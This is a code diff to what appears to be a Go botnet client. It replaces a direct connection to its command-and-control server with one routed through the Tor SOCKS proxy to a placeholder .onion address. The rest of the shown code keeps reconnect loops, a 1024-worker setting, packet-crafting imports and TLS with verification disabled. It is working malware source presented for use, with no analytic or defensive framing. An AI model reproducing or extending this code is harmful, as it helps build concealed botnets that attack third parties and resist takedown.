@@ -12,6 +12,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"runtime"
 	"strconv"
 	"strings"
@@ -23,10 +24,12 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/miekg/dns"
 	"github.com/shirou/gopsutil/mem"
+	"golang.org/x/net/proxy"
 )
 
 const (
-	BOT_SERVER_IP     = "localhost"
+	BOT_SERVER_IP     = "server.onion" // Replace with your actual .onion address
+	TOR_PROXY         = "127.0.0.1:9050" // Standard Tor SOCKS proxy address
 	reconnectDelay    = 5 * time.Second
 	numWorkers        = 1024
 	heartbeatInterval = 30 * time.Second
@@ -58,7 +61,7 @@ func main() {
 	rand.Seed(time.Now().UnixNano())
 
 	for {
-		conn, err := connectToC2()
+		conn, err := connectToC2ViaTor()
 		if err != nil {
 			log.Printf("Connection failed: %v", err)
 			time.Sleep(reconnectDelay)
@@ -80,7 +83,14 @@ func main() {
 	}
 }
 
-func connectToC2() (net.Conn, error) {
+func connectToC2ViaTor() (net.Conn, error) {
+	// Create a SOCKS5 dialer using the Tor proxy
+	torDialer, err := proxy.SOCKS5("tcp", TOR_PROXY, nil, proxy.Direct)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create SOCKS5 dialer: %w", err)
+	}
+
+	// Create TLS config
 	tlsConfig := &tls.Config{
 		MinVersion: tls.VersionTLS12,
 		CipherSuites: []uint16{
@@ -93,22 +103,24 @@ func connectToC2() (net.Conn, error) {
 		InsecureSkipVerify: true, // Only for testing with self-signed certs
 	}
 
-	// Retry logic
+	// Retry logic for connection
 	var conn net.Conn
-	var err error
 	for i := 0; i < 3; i++ {
-		conn, err = tls.Dial("tcp", BOT_SERVER_IP+":"+"56123", tlsConfig)
+		// Connect to the C2 server through Tor
+		conn, err = torDialer.Dial("tcp", BOT_SERVER_IP+":"+"56123")
 		if err == nil {
-			break
+			// Upgrade connection to TLS
+			tlsConn := tls.Client(conn, tlsConfig)
+			if err := tlsConn.Handshake(); err != nil {
+				conn.Close()
+				return nil, fmt.Errorf("TLS handshake failed: %w", err)
+			}
+			return tlsConn, nil
 		}
 		time.Sleep(2 * time.Second)
 	}
 
-	if err != nil {
-		return nil, fmt.Errorf("failed to connect to C2 server: %w", err)
-	}
-
-	return conn, nil
+	return nil, fmt.Errorf("failed to connect to C2 server via Tor: %w", err)
 }
 
 func runBot(conn net.Conn) error {
